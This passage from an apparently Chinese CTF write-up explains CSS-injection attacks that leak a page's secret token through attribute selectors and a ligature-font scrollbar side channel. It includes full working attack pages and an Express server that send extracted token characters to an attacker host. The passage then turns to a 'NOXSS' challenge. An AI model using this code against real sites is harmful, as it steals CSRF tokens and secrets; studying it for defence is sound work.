机制来构建异步函数，每隔50毫秒检查一次 cookie 是否已设置，如果已设置，该函数将立即返回该值。 1234567891011function getTokenFromCookie() { return new Promise(resolve =&gt; { const interval = setInterval(function() { const token = Cookies.get('token'); if (token) { clearInterval(interval); resolve(token); } }, 50); });} 最后整合起来的攻击方式是这样的： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=\"http://127.0.0.1:3000/cookie.js\"&gt;&lt;/script&gt; &lt;big id=token&gt;&lt;/big&gt;&lt;br&gt; &lt;iframe id=iframe&gt;&lt;/iframe&gt; &lt;script&gt; (async function () { const EXPECTED_TOKEN_LENGTH = 32; const ALPHABET = Array.from(\"0123456789abcdef\"); const iframe = document.getElementById('iframe'); let extractedToken = ''; while (extractedToken.length &lt; EXPECTED_TOKEN_LENGTH) { clearTokenCookie(); createIframeWithCss(); extractedToken = await getTokenFromCookie(); document.getElementById('token').textContent = extractedToken; } function getTokenFromCookie() { return new Promise(resolve =&gt; { const interval = setInterval(function () { const token = Cookies.get('token'); if (token) { clearInterval(interval); resolve(token); } }, 50); }); } function clearTokenCookie() { Cookies.remove('token'); } function generateCSS() { let css = ''; for (let char of ALPHABET) { css += `input[value^=\"${extractedToken}${char}\"] { background: url(http://127.0.0.1:3000/token/${extractedToken}${char}) }`; } return css; } function createIframeWithCss() { iframe.src = 'http://127.0.0.1/css.php?css=' + encodeURIComponent(generateCSS()); } })(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 效果如下图所示： Token1 - Same Origin这个过程需要理解的就是在字符注入爆破成功时设置的 cookie ，它需要我们用 iframe src 同源的域名才能拿到这个 cookie ，否则会受到同源策略的限制拿不到，我们可以做一个简单的测试： 123456789101112131415161718192021222324252627282930&lt;big id=token&gt;&lt;/big&gt;&lt;br&gt;&lt;iframe src=\"http://127.0.0.1:3000/token/7\"&gt;&lt;/iframe&gt;&lt;script src=\"http://127.0.0.1:3000/cookie.js\"&gt;&lt;/script&gt;&lt;script&gt; (async function () { const EXPECTED_TOKEN_LENGTH = 32; const ALPHABET = Array.from(\"0123456789abcdef\"); const iframe = document.getElementById('iframe'); let extractedToken = ''; clearTokenCookie(); extractedToken = await getTokenFromCookie(); document.getElementById('token').textContent = extractedToken; function getTokenFromCookie() { return new Promise(resolve =&gt; { const interval = setInterval(function () { const token = Cookies.get('token'); if (token) { clearInterval(interval); resolve(token); } }, 50); }); } function clearTokenCookie() { Cookies.remove('token'); } })();&lt;/script&gt;&lt;iframe src=\"http://127.0.0.1:3000/token/78\"&gt;&lt;/iframe&gt; 这里zedd.vv映射到了 127.0.0.1 ，可以看到因为不同源，zedd.vv是拿不到 iframe 的 cookie 的，而通过 127.0.0.1 访问 test.html ，因为服务对于 cookie 的设置存在Path=/，所以我们能在父页面也能拿到 iframe 当中的 cookie Token2 - Font现在我们来尝试去获取 javascript 代码中的 token2，在开始之前我们先了解一下什么叫做连字： 连字简述 连字那些事 简而言之，字体中的连字是至少两个具有图形表示形式的字符的序列。最常见的连字可能是”fi”序列。在下面的图片中，我们可以很清晰地看到”f”与”i”；而在第二行中，我们对这两个字母的顺序使用了不同的字体表示-字母”f”的顶部连接到”i”上方的点。这里我们应该将连字与字距区别开来：字距调整仅确定字体中字母之间的距离，而连字是给定字符序列的完全独立的字形（图形符号）。 我们可以借助 fontforge 来生成我们需要的连字，因为现代浏览器已经不支持 SVG 格式的字体了，我们可以利用 fontforge 将 SVG 格式转换成 WOFF 格式，我们可以准备一个名为 script.fontforge 的文件，内容如下： 123#!/usr/bin/fontforgeOpen($1)Generate($1:r + \".woff\") 我们可以用fontforge script.fontforge &lt;plik&gt;.svg这个命令来生成 woff 文件，下面这段 svg 代码定义了一种名叫 hack 的字体，包括 a-z 26 个0宽度的字母，以及 sekurak 这个宽度为8000的连字。 1234567891011121314151617181920212223242526272829303132333435&lt;svg&gt; &lt;defs&gt; &lt;font id=\"hack\" horiz-adv-x=\"0\"&gt; &lt;font-face font-family=\"hack\" units-per-em=\"1000\" /&gt; &lt;missing-glyph /&gt; &lt;glyph unicode=\"a\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"b\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"c\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"d\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"e\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"f\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"g\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"h\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"i\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"j\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"k\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"l\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"m\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"n\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"o\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"p\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"q\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"r\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"s\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"t\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"u\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"v\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"w\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"x\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"y\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"z\" horiz-adv-x=\"0\" d=\"M1 0z\"/&gt; &lt;glyph unicode=\"sekurak\" horiz-adv-x=\"8000\" d=\"M1 0z\"/&gt; &lt;/font&gt; &lt;/defs&gt;&lt;/svg&gt; 将以上代码保存为 test.svg，然后使用fontforge ./script.fontforge test.svg命令生成 test.woff ，我们再将其引入就好了。 这里我们做个简单的验证，将以下代码保存为 test.html 12345678910111213141516171819202122232425262728293031&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;style&gt; @font-face { font-family: \"hack\"; src: url(\"./test.woff\"); } span { background: lightblue; font-family: \"hack\"; } body { white-space: nowrap; } body::-webkit-scrollbar { background: blue; } body::-webkit-scrollbar:horizontal { background: url(http://127.0.0.1:9999); } &lt;/style&gt; &lt;span id=span&gt;123sekurak123&lt;/span&gt;&lt;/body&gt;&lt;/html&gt; 然后用一个 font.html 用 iframe 将其引入: 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;iframe src=\"http://127.0.0.1/test.html\" frameborder=\"0\" width=\"100px\"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt; 访问 test.html 之后我们可以看到收到了请求。 这里的原理也比较简单，在基于 WebKit 或其分支之一的浏览器中，我们可以使用-webkit-scrollbar来设置滚动条样式，而出现滚动条样式，我们需要使用nowrap让其不换行。这里需要注意的是，如果要完全设置样式，先得添加伪类-webkit-scrollbar，这样才能利用连字的宽度来触发-webkit-scrollbar:horizontal属性来执行我们的请求。 Token2 - Get From JavaScript从上面这个 demo 我们大概就可以得到一个思路了，将所有字体也都设置为0，然后用连字的方法来爆破得到 token2 这里直接给出波兰那位作者的代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118const express = require('express');const app = express();// Serwer ExprssJS domyślnie dodaje nagłówek ETag,// ale nam nie jest to potrzebne, więc wyłączamy.app.disable('etag');const PORT = 3001;const js2xmlparser = require('js2xmlparser');const fs = require('fs');const tmp = require('tmp');const rimraf = require('rimraf');const child_process = require('child_process');// Generujemy fonta dla zadanego przedrostka// i znaków, dla których ma zostać utworzona ligatura.function createFont(prefix, charsToLigature) { let font = { \"defs\": { \"font\": { \"@\": { \"id\": \"hack\", \"horiz-adv-x\": \"0\" }, \"font-face\": { \"@\": { \"font-family\": \"hack\", \"units-per-em\": \"1000\" } }, \"glyph\": [] } } }; // Domyślnie wszystkie możliwe znaki mają zerową szerokość... let glyphs = font.defs.font.glyph; for (let c = 0x20; c &lt;= 0x7e; c += 1) { const glyph = { \"@\": { \"unicode\": String.fromCharCode(c), \"horiz-adv-x\": \"0\", \"d\": \"M1 0z\", } }; glyphs.push(glyph); } // ... za wyjątkiem ligatur, które są BARDZO szerokie. charsToLigature.forEach(c =&gt; { const glyph = { \"@\": { \"unicode\": prefix + c, \"horiz-adv-x\": \"10000\", \"d\": \"M1 0z\", } } glyphs.push(glyph); }); // Konwertujemy JSON-a na SVG. const xml = js2xmlparser.parse(\"svg\", font); // A następnie wykorzystujemy fontforge // do zamiany SVG na WOFF. const tmpobj = tmp.dirSync(); fs.writeFileSync(`${tmpobj.name}/font.svg`, xml); child_process.spawnSync(\"/usr/bin/fontforge\", [ `${__dirname}/script.fontforge`, `${tmpobj.name}/font.svg` ]); const woff = fs.readFileSync(`${tmpobj.name}/font.woff`); // Usuwamy katalog tymczasowy. rimraf.sync(tmpobj.name); // I zwracamy fonta w postaci WOFF. return woff;}// Endpoint do generowania fontów.app.get(\"/font/:prefix/:charsToLigature\", (req, res) =&gt; { const { prefix, charsToLigature } = req.params; // Dbamy o to by font znalazł się w cache'u. res.set({ 'Cache-Control': 'public, max-age=600', 'Content-Type': 'application/font-woff', 'Access-Control-Allow-Origin': '*', }); res.send(createFont(prefix, Array.from(charsToLigature))); });// Endpoint do przyjmowania znaków przez połączenie zwrotneapp.get(\"/reverse/:chars\", function(req, res) { res.cookie('chars', req.params.chars); res.set('Set-Cookie', `chars=${encodeURIComponent(req.params.chars)}; Path=/`); res.send();});app.get('/cookie.js', (req, res) =&gt; {trueres.sendFile('js.cookie.js', {truetrueroot: './node_modules/js-cookie/src/'true});});app.get('/index.html', (req, res) =&gt; {trueres.sendFile('index.html', {truetrueroot: '.'true});});app.listen(PORT, () =&gt; {trueconsole.log(`Listening on ${PORT}...`);}) 这里我们先只用到/font的 api 用来直接生成我们需要的 woff 文件，然后我们构造两个页面，第一个 test.html ，包含我们需要获取的 token2 ，有以下代码： 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; var token2 = \"7b8a45b8297cf82cc3cefc174c3ae5a1\"; &lt;/script&gt; &lt;style&gt; @font-face { font-family: \"hack\"; src: url(http://172.16.71.138:3001/font/%22/7); } script { display: table; font-family: \"hack\"; white-space: nowrap; background: lightblue; } body::-webkit-scrollbar { background: blue; } body::-webkit-scrollbar:horizontal { display:block; background: blue url(http://127.0.0.1:9999); } &lt;/style&gt;&lt;/body&gt;&lt;/html&gt; 我们这里用display:table将script标签内的内容输出出来，然后禁止换行，并使用我们构造的字体。那个 url 获取到的就是以下 svg 生成的 woff 文件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104&lt;?xml version='1.0'?&gt;&lt;svg&gt; &lt;defs&gt; &lt;font id='hack' horiz-adv-x='0'&gt; &lt;font-face font-family='hack' units-per-em='1000'/&gt; &lt;glyph unicode=' ' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='!' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='\"' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='#' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='$' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='%' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='&amp;amp;' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='&amp;apos;' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='(' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode=')' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='*' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='+' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode=',' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='-' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='.' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='/' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='0' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='1' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='2' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='3' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='4' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='5' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='6' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='7' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='8' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='9' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode=':' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode=';' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='&amp;lt;' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='=' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='&gt;' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='?' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='@' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='A' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='B' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='C' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='D' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='E' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='F' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='G' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='H' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='I' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='J' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='K' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='L' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='M' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='N' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='O' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='P' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='Q' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='R' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='S' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='T' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='U' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='V' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='W' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='X' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='Y' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='Z' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='[' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='\\' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode=']' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='^' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='_' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='`' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='a' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='b' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='c' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='d' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='e' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='f' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='g' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='h' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='i' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='j' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='k' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='l' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='m' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='n' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='o' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='p' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='q' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='r' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='s' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='t' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='u' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='v' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='w' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='x' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='y' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='z' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='{' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='|' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='}' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='~' horiz-adv-x='0' d='M1 0z'/&gt; &lt;glyph unicode='\"7' horiz-adv-x='10000' d='M1 0z'/&gt; &lt;/font&gt; &lt;/defs&gt;&lt;/svg&gt; 也就是说这里构造了一个除了\"7连字有一定宽度之外，其他字符都是0宽度。 第二个页面就是 font.html ，内容比较简单，构造一个适当宽度的 iframe 将 test.html 引入即可。 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;iframe src=\"http://127.0.0.1/test.html\" frameborder=\"0\" style=\"width:500px\"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt; 至于 width 为 500 px，是script标签内内容长度，这个需要宽度也比较关键，因为 svg 中连字的构建也不是特比好构建，也就是如果无法构建好连字，也就无法弄出滚动条，也就无处触发我们构造的请求了。所以 iframe 的宽度并不是越宽越好… svg horiz-adv-x 的参数也不是越大就能触发… 如果按照原作者设置的 iframe width 为 40px，svg 连字 horiz-adv-x 参数为 1000 的话，就会出现如上情况。如果各位小伙伴去自己尝试一下就会发现，有一个很明显的 lightblue 颜色的瞬间，也就是 script 标签的颜色，个人认为因为浏览器渲染的顺序问题，先把在这个场景中长度为 463px 的 script 标签首先因为display:table的原因，在网络请求字体之前首先被渲染了，所以会看到一条 lightblue 颜色带一闪而过，导致撑破了 iframe 设置的长度，也就产生了滚动条，随即触发了我们构造的请求，随后字体才会被浏览器进行渲染，然后将我们构造的其他字体设为 0 宽度。 而且还有一些问题就是缓存的问题，效果如下： 这也是原作者在原文提到的先发送一个请求让 chrome 缓存好字体的原因，但是这个方法及其不稳定…用原作者的代码直接跑跑的结果也是五花八门，每次跑都不一样。 然后比较稳定的办法是，预测 script 标签内的长度，比如这里的 463px ，我们设置一个比它大的值，这样一开始的渲染就不会影响到我们的结果了，对应的连字 horiz-adv-x 我们也将其扩大到 500000 ，这样就能保证每次都可以以正确的结果造成宽度溢出然后触发我们的请求了。 But，这个办法需要知道大概 script 标签内大概的宽度，万一不知道呢？ 我们可以参考 ROIS 的做法，使用 iframe 的 onload 事件，当 iframe 加载完成之后再将 iframe 宽度缩小，这样就能稳定触发了。也就是说 font.html 中 iframe 我们可以这么写： 1&lt;iframe src=\"http://127.0.0.1/test.html\" frameborder=\"0\" style=\"width:10000px\" onload=\"event.target.style.width='100px'\"&gt;&lt;/iframe&gt; 一开始设置一个特别大的宽度，保证不会因为渲染顺序的原因触发我们构造的请求，待到 iframe 内字体加载完毕，再将其宽度缩小，触发我们构造的请求。 以下是原作者使用二分加快爆破、提前缓存避免缓存问题构造的 index.html 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206&lt;!doctype html&gt;&lt;meta charset=utf-8&gt;&lt;script src=cookie.js&gt;&lt;/script&gt;&lt;big id=token&gt;&lt;/big&gt;&lt;br&gt;&lt;script&gt; (async function() { const EXPECTED_TOKEN_LENGTH = 32; const ALPHABET = '0123456789abcdef'; // W poniższym elemencie będziemy wypisywać przeczytany token. const outputElement = document.getElementById('token'); // W tej zmiennej przechowamy token, który udało się już // wydobyć let extractedToken = ''; // W tej zmiennej przechowamy prefix do tworzenia ligatur let prefix = '\"'; // Wysokopoziomowo: po prostu wyciągamy kolejny znak tokena // dopóki nie wyciągnęliśmy wszystkich znaków :) while (extractedToken.length &lt; EXPECTED_TOKEN_LENGTH) { const nextTokenChar = await getNextTokenCharacter(); extractedToken += nextTokenChar; // Znak, który wyciągnęliśmy musi być też dodany do przedrostka // dla następnych ligatur. prefix += nextTokenChar; // Wypiszmy w HTML-u jaki token jak na razie wyciągnęliśmy. outputElement.textContent = extractedToken; } // Jak dotarliśmy tutaj, to znaczy, że mamy cały token! // W ramach świętowania usuńmy wszystkie iframe'y i ustawmy // pogrubienie na tokenie widocznym w HTML-u ;-) deleteAllIframes(); outputElement.style.fontWeight = 'bold'; // Funkcja, której celem jest wydobycie następnego znaku tokena // metodą dziel i zwyciężaj. async function getNextTokenCharacter() { // Dla celów wydajnościowych - usuńmy wszystkie istniejące elementy iframe. deleteAllIframes(); let alphabet = ALPHABET; // Wykonujemy operacje tak długo aż wydobędziemy informację // jaki jest następny znak tokena. while (alphabet.length &gt; 1) { // Będziemy oczekiwać na utworzenie nowego ciasteczka - najpierw więc // usuńmy wszystkie istniejące. clearAllCookies(); const [leftChars, rightChars] = split(alphabet); // Najpierw upewniamy się, że fonty dla obu zestawów ligatur // są w cache'u. await makeSureFontsAreCached(leftChars, rightChars); // Niestety - praktyczne testy pokazały, że wrzucenie w to miejsce // sztucznego opóźnienia znacząco zwiększa prawdopodobieństwo, że atak // po drodze się nie \"wysypie\"... await delay(100); // A potem tworzymy dwa iframe'y z \"atakującym\" CSS-em await Promise.all([createAttackIframe(leftChars), createAttackIframe(rightChars)]); // Czekamy na znaki z połączenia zwrotnego... const chars = await getCharsFromReverseConnection(); // ... i na ich podstawie kontynuujemy \"dziel i zwyciężaj\". alphabet = chars; } // Jeśli znaleźliśmy się w tym miejscu, to znaczy, że alphabet // ma jeden znak. Wniosek: ten jeden znak to kolejny znak tokena. return alphabet; } function clearAllCookies() { Object.keys(Cookies.get()).forEach(cookie =&gt; { Cookies.remove(cookie); }); } function deleteAllIframes() { document.querySelectorAll('iframe').forEach(iframe =&gt; { iframe.parentNode.removeChild(iframe); }); } // Funkcja dzieląca string na dwa stringi o tej // samej długości (lub różnej o jeden). // Np. split(\"abcd\") == [\"ab\", \"cd\"]; function split(s) { const halfLength = parseInt(s.length / 2); return [s.substring(0, halfLength), s.substring(halfLength)]; } // Funkcja generująca losowego stringa, np. // randomValue() == \"rand6226966173982633\" function randomValue() { return \"rand\" + Math.random().toString().slice(2); } // Generujemy CSS-a, który zapewni nam, że fonty znajdą się w cache. // Jako dowód na to, że font został już pobrany, użyjemy sprawdzenia // czy ciasteczko font_${losowy_ciąg_znaków} zostało zdefiniowane. function makeSureFontsAreCached(leftChars, rightChars) { return new Promise(resolve =&gt; { // Enkodujemy wszystkie wartości, by móc umieścić je bezpiecznie w URL-u. let encodedPrefix; [encodedPrefix, leftChars, rightChars] = [prefix, leftChars, rightChars].map(val =&gt; encodeURIComponent(val)); // Generujemy CSS-a odwołującego się do obu fontów. Używamy body:before i body:after // by upewnić się, że przeglądarka będzie musiała oba fonty pobrać. const css = ` @font-face { font-family: 'hack1'; src: url(http://192.168.13.37:3001/font/${encodedPrefix}/${leftChars}) } @font-face { font-family: 'hack2'; src: url(http://192.168.13.37:3001/font/${encodedPrefix}/${rightChars}) } body:before { content: 'x'; font-family: 'hack1'; } body:after { content: 'x'; font-family: 'hack2'; } `; // Tworzymy iframe, w którym załadowane zostaną fonty const iframe = document.createElement('iframe'); iframe.onload = () =&gt; { // Funkcja zakończy swoje działanie dopiero gdy zostanie wyzwolone zdarzenie // onload w elemencie iframe resolve(); } iframe.src = 'http://localhost:12345/?css=' + encodeURIComponent(css); document.body.appendChild(iframe); }) } // Jak wywołana zostaje ta funkcja, to już mamy pewność, że fonty // są w cache'u. Spróbujmy więc zaatakować z takim stylem, w wyniku // którego pojawi się pasek przewijania, jeśli trafiliśmy ze znakami // w tokenie. function createAttackIframe(chars) { return new Promise(resolve =&gt; { // Enkodujemy wszystkie wartości, by móc umieścić je bezpiecznie w URL-u. let encodedPrefix; [encodedPrefix, chars] = [prefix, chars].map(val =&gt; encodeURIComponent(val)); const css = ` @font-face { font-family: \"hack\"; src: url(http://192.168.13.37:3001/font/${encodedPrefix}/${chars}) } script { display: table; font-family: \"hack\"; white-space: nowrap; } body::-webkit-scrollbar { background: blue; } body::-webkit-scrollbar:horizontal { background: blue url(http://192.168.13.37:3001/reverse/${chars}); } `; const iframe = document.createElement('iframe'); iframe.onload = () =&gt; { resolve(); } iframe.src = 'http://localhost:12345/?css=' + encodeURIComponent(css); // Ten iframe musi być stosunkowo wąski - by pojawił się pasek przewijania. iframe.style.width = \"40px\"; document.body.appendChild(iframe); }) } // Sprawdzamy co 20ms czy dostaliśmy połączenie zwrotne wygenerowane // przez pasek przewijania. Jeśli tak - to zwracamy wartość z ciasteczka chars. function getCharsFromReverseConnection() { return new Promise(resolve =&gt; { const interval = setInterval(() =&gt; { const chars = Cookies.get('chars'); if (chars) { clearInterval(interval); resolve(chars); } }, 20); }) } async function delay(time) { return new Promise(resolve =&gt; { setTimeout(resolve, time); }) } })();&lt;/script&gt; 但是我没成功过2333… NOXSS终于可以回到我们的题目了，其实走完以上流程，这个题目已经迎刃而解了，出题人出的点也正是 token2 的点。 随便注册一个账号之后，我们可以在 theme 参数发现有代码注入的地方，但是过滤了尖括号，我们可以用%0a进行换行 但是我们的最终目的跟 token2 场景类似，还是拿到 script 标签中的 secret 变量 根据 token2 场景的解法，接下来我们至少需要做到可以执行我们任意 css 代码才行。 根据文档css newline，我们可以知道换行有如下写法： 而且文档里也提到了error-handling ​ When errors occur in CSS, the parser attempts to recover gracefully, throwing away only the minimum amount of content before returning to parsing as normal. This is because errors aren’t always mistakes—new syntax looks like an error to an old parser, and it’s useful to be able to add new 